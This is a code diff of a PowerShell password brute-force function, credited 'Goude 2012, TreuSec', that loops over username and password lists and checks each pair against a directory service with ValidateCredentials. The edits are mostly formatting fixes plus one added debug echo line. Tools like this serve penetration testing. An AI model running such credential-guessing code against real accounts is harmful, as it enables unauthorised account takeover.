@@ -75,9 +75,9 @@ Goude 2012, TreuSec
         [Parameter(Position = 4, Mandatory = $false)]
         [Switch]
         $StopOnSuccess,
-		
+        
         [Parameter(Position = 5, Mandatory = $false)]
-	[Double]
+        [Double]
         $Jitter = .3,
 
         [Parameter(Position = 6, Mandatory = $false)]
@@ -89,16 +89,17 @@ Goude 2012, TreuSec
     {
         $usernames = Get-Content -ErrorAction SilentlyContinue -Path $UserList
         $passwords = Get-Content -ErrorAction SilentlyContinue -Path $PasswordList
-		if (!$usernames) { 
-			$usernames = $UserList
-			Write-Verbose "UserList file does not exist. Using UserList as usernames:"
-			Write-Verbose $usernames
-		}
-		if (!$passwords) {
-			$passwords = $PasswordList
-		    Write-Verbose "PasswordList file does not exist. Using PasswordList as passwords:"
-			Write-Verbose $passwords
-		}
+        echo $usernames
+        if (!$usernames) { 
+            $usernames = $UserList
+            Write-Verbose "UserList file does not exist. Using UserList as usernames:"
+            Write-Verbose $usernames
+        }
+        if (!$passwords) {
+            $passwords = $PasswordList
+            Write-Verbose "PasswordList file does not exist. Using PasswordList as passwords:"
+            Write-Verbose $passwords
+        }
 
         $RandNo = New-Object System.Random
 
@@ -224,16 +225,16 @@ Goude 2012, TreuSec
             {
                 :UsernameLoop foreach ($username in $usernames)
                 {
-                    foreach ($Password in $Passwords)
+                    foreach ($password in $passwords)
                     {
                         Try
                         {
-                            Write-Verbose "Checking $userName : $password"
+                            Write-Verbose "Checking $username : $password"
                             $success = $principalContext.ValidateCredentials($username, $password)
                             $message = "Password Match"
                             if ($success -eq $true)
                             {
-                                Write-Output "Match found! $username : $Password"
+                                Write-Output "Match found! $username : $password"
                                 if ($StopOnSuccess)
                                 {
                                     break UsernameLoop
@@ -251,9 +252,9 @@ Goude 2012, TreuSec
                     }
                 }
             }
-			else {
-				Write $message
-			}
+            else {
+            Write $message    
+            }
         }
         #Brute Force Web
         elseif ($service -eq "Web")
